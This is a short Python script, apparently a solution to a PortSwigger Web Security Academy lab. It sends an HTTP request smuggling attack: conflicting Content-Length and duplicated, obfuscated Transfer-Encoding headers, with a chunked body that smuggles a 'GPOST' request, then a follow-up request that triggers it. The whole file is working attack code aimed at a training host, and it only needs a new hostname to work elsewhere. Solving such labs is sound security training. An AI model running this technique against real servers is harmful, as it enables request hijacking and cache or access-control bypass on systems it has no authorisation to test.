import http.client


def send_request(url, method="GET", headers={}, body=None):
    try:
        connection = http.client.HTTPSConnection(url)
        connection.request(method, "/", body=body, headers=headers)
        response = connection.getresponse()

        if response.status == 200:
            print("OK !")
        else:
            content = response.read().decode("utf-8")
            print(f"NO: {response.status} {response.reason} {content}")

    except Exception as e:
        print(f"Error request: {e}")


if __name__ == "__main__":
    lab = "0a3200a5047c1a988181b649006f00f9" + ".web-security-academy.net"

    request_method = "POST"

    request_headers = {
        "Host": lab,
        "Content-length": "4",
        "Transfer-Encoding": "chunked",
        "Transfer-encoding": "x",
    }

    request_body = (
        "66\r\n"
        f"GPOST https://{lab}/ HTTP/1.1\r\n"
        "Content-Length: 6\r\n"
        "\r\n"
        "0\r\n\r\n"
    )

    send_request(
        url=lab, method=request_method, headers=request_headers, body=request_body
    )

    send_request(url=lab, method=request_method)
